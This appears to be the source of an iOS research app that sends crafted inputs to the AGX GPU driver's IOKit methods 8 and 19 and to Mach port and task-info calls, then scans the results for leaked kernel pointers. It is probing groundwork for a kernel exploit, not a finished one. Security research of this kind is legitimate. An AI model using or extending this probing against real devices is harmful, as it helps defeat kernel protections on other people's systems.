#import <UIKit/UIKit.h>
#import <IOKit/IOKitLib.h>
#import <Foundation/Foundation.h>
#import <IOSurface/IOSurfaceRef.h>
#import <string.h>
#import <mach/mach_host.h>
#import <mach/task_info.h>
#import <mach/port.h>
#import <stdlib.h>
static NSMutableString *gLog; static NSString *gPath; static io_connect_t C;
static void L(NSString *fmt,...){va_list ap;va_start(ap,fmt);NSString*s=[[NSString alloc]initWithFormat:fmt arguments:ap];va_end(ap);[gLog appendString:s];[gLog appendString:@"\n"];[gLog writeToFile:gPath atomically:YES encoding:NSUTF8StringEncoding error:nil];NSLog(@"[s19] %@",s);}
static uint64_t rd64(const void*p){uint64_t v;memcpy(&v,p,8);return v;}
static void s19(const char*tag,uint64_t id){uint64_t si[1]={id};uint8_t o[0x100];memset(o,0xAA,sizeof(o));size_t os=0x18;uint64_t so[4]={0};uint32_t soc=0;
 kern_return_t kr=IOConnectCallMethod(C,19,si,1,NULL,0,so,&soc,o,&os);L(@"[%s id=0x%llx] kr=0x%x osz=0x%zx q0=0x%llx q1=0x%llx q2=0x%llx",tag,(unsigned long long)id,kr,os,(unsigned long long)rd64(o),(unsigned long long)rd64(o+8),(unsigned long long)rd64(o+0x10));}
static kern_return_t mk(uint32_t type,uint64_t a30,uint64_t a38,uint64_t a40,uint64_t a48,uint32_t a50,uint8_t*out){uint8_t in[0x100];memset(in,0,sizeof(in));*(uint32_t*)in=type;*(uint64_t*)(in+0x30)=a30;*(uint64_t*)(in+0x38)=a38;*(uint64_t*)(in+0x40)=a40;*(uint64_t*)(in+0x48)=a48;*(uint32_t*)(in+0x50)=a50;memset(out,0xAA,0x1000);size_t os=0x1000;return IOConnectCallStructMethod(C,8,in,0x100,out,&os);}
static void tryres(const char*tag,uint32_t type,uint64_t base,uint64_t len){
 uint8_t o[0x1000];kern_return_t kr=mk(type,0,base,0,len,0x4000,o);
 uint32_t rid=*(uint32_t*)(o+0x24); uint64_t q0=rd64(o),q5=rd64(o+0x28),q6=rd64(o+0x30),q7=rd64(o+0x38),q9=rd64(o+0x48),q10=rd64(o+0x50);
 L(@"[%s] kr=0x%x rid=%u q0=0x%llx q5=0x%llx q6=0x%llx q7=0x%llx q9=0x%llx q10=0x%llx",tag,kr,rid,(unsigned long long)q0,(unsigned long long)q5,(unsigned long long)q6,(unsigned long long)q7,(unsigned long long)q9,(unsigned long long)q10);
 if(kr)return;
 uint64_t ids[]={rid,q6,q7};
 for(int i=0;i<3;i++)s19(tag,ids[i]);
}
static void scan(const char*tag,const void*buf,size_t n){const uint8_t*b=buf;for(size_t i=0;i+8<=n;i+=8){uint64_t v;memcpy(&v,b+i,8);if((v&0xfffffff000000000ULL)==0xfffffff000000000ULL)L(@"[HIT %s] +0x%zx=0x%llx",tag,i,(unsigned long long)v);}}
static void probe_kernel_ptrs(void){
 mach_port_t host=mach_host_self(); natural_t type=0; mach_vm_address_t kobj=0;
 kern_return_t kr=mach_port_kobject(mach_task_self(),host,&type,&kobj); L(@"[kobj host] kr=0x%x type=%u kobj=0x%llx",kr,type,(unsigned long long)kobj); scan("kobjhost",&kobj,8);
 kobj=0;type=0;kr=mach_port_kobject(mach_task_self(),mach_task_self(),&type,&kobj); L(@"[kobj task] kr=0x%x type=%u kobj=0x%llx",kr,type,(unsigned long long)kobj); scan("kobjtask",&kobj,8);
 kobj=0;type=0;kr=mach_port_kobject(mach_task_self(),bootstrap_port,&type,&kobj); L(@"[kobj boot] kr=0x%x type=%u kobj=0x%llx",kr,type,(unsigned long long)kobj); scan("kobjboot",&kobj,8);
 ipc_info_space_t info; ipc_info_name_array_t tab=NULL; mach_msg_type_number_t tc=0; ipc_info_tree_name_array_t tree=NULL; mach_msg_type_number_t tr=0;
 kr=mach_port_space_info(mach_task_self(),&info,&tab,&tc,&tree,&tr); L(@"[space] kr=0x%x names=%u tree=%u",kr,tc,tr);
 if(tab&&tc){scan("space_names",tab,tc*sizeof(ipc_info_name_t)); vm_deallocate(mach_task_self(),(vm_address_t)tab,tc*sizeof(ipc_info_name_t));}
 if(tree&&tr){scan("space_tree",tree,tr*sizeof(ipc_info_tree_name_t)); vm_deallocate(mach_task_self(),(vm_address_t)tree,tr*sizeof(ipc_info_tree_name_t));}
 for(int f=0;f<=32;f++){uint8_t b[4096];memset(b,0,sizeof(b));mach_msg_type_number_t c=sizeof(b)/sizeof(natural_t);kr=task_info(mach_task_self(),f,(task_info_t)b,&c);if(kr==KERN_SUCCESS){char t[64];snprintf(t,sizeof(t),"task_info%d",f);scan(t,b,(size_t)c*sizeof(natural_t));}}
}
static void run(void){
 probe_kernel_ptrs();
 io_service_t svc=IOServiceGetMatchingService(kIOMasterPortDefault,IOServiceMatching("AGXAcceleratorG14P"));L(@"[svc] 0x%x",svc);if(!svc)return;
 kern_return_t kr=IOServiceOpen(svc,mach_task_self(),1,&C);IOObjectRelease(svc);L(@"[open] 0x%x",kr);if(kr)return;
 NSDictionary*d=@{@"IOSurfaceAllocSize":@0x10000,@"IOSurfaceMemoryRegion":@"PurpleGfxMem"};
 IOSurfaceRef s=IOSurfaceCreate((__bridge CFDictionaryRef)d);void*b=IOSurfaceGetBaseAddress(s);size_t al=IOSurfaceGetAllocSize(s);L(@"[purple] base=%p alloc=0x%zx",b,al);memset(b,0x5A,al);
 tryres("t0",0,(uint64_t)(uintptr_t)b,0x4000);
 tryres("t40",0x40,(uint64_t)(uintptr_t)b,0x4000);
 tryres("t3",3,0x40,0);
 NSDictionary*pd=@{(id)kIOSurfaceWidth:@64,(id)kIOSurfaceHeight:@64,(id)kIOSurfaceBytesPerElement:@4,(id)kIOSurfacePixelFormat:@0x42475241};
 IOSurfaceRef sf=IOSurfaceCreate((__bridge CFDictionaryRef)pd);uint32_t sid=sf?IOSurfaceGetID(sf):0;L(@"[surface] %p id=%u",sf,sid);
 uint8_t o[0x1000]; if(sf){uint8_t in[0x100];memset(in,0,sizeof(in));*(uint32_t*)in=0x82;*(uint32_t*)(in+0x38)=sid;size_t os=0x1000;kr=IOConnectCallStructMethod(C,8,in,0x100,o,&os);uint32_t rid=*(uint32_t*)(o+0x24);L(@"[t82] kr=0x%x rid=%u q6=0x%llx q7=0x%llx",kr,rid,(unsigned long long)rd64(o+0x30),(unsigned long long)rd64(o+0x38));uint64_t ids[]={rid,rd64(o+0x30),rd64(o+0x38)};for(int i=0;i<3;i++)s19("t82",ids[i]);}
 if(s)CFRelease(s);if(sf)CFRelease(sf);IOServiceClose(C);L(@"=== done ===");
}
@interface AppDelegate:UIResponder<UIApplicationDelegate>@property(strong,nonatomic)UIWindow*window;@end
@implementation AppDelegate
- (BOOL)application:(UIApplication*)app didFinishLaunchingWithOptions:(NSDictionary*)opts{
 self.window=[[UIWindow alloc]initWithFrame:[UIScreen mainScreen].bounds];UIViewController*vc=[UIViewController new];vc.view.backgroundColor=UIColor.blackColor;
 UITextView*tv=[[UITextView alloc]initWithFrame:vc.view.bounds];tv.backgroundColor=UIColor.blackColor;tv.textColor=UIColor.greenColor;tv.font=[UIFont monospacedSystemFontOfSize:9 weight:UIFontWeightRegular];tv.editable=NO;tv.text=@"Sel19Probe\n";
 [vc.view addSubview:tv];self.window.rootViewController=vc;[self.window makeKeyAndVisible];[UIApplication sharedApplication].idleTimerDisabled=YES;
 dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH,0),^{NSString*docs=[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,NSUserDomainMask,YES) firstObject];gPath=[docs stringByAppendingPathComponent:@"s19.log"];gLog=[NSMutableString new];run();dispatch_async(dispatch_get_main_queue(),^{tv.text=gLog;});});
 return YES;}
@end
int main(int argc,char**argv){@autoreleasepool{return UIApplicationMain(argc,argv,nil,NSStringFromClass([AppDelegate class]));}}
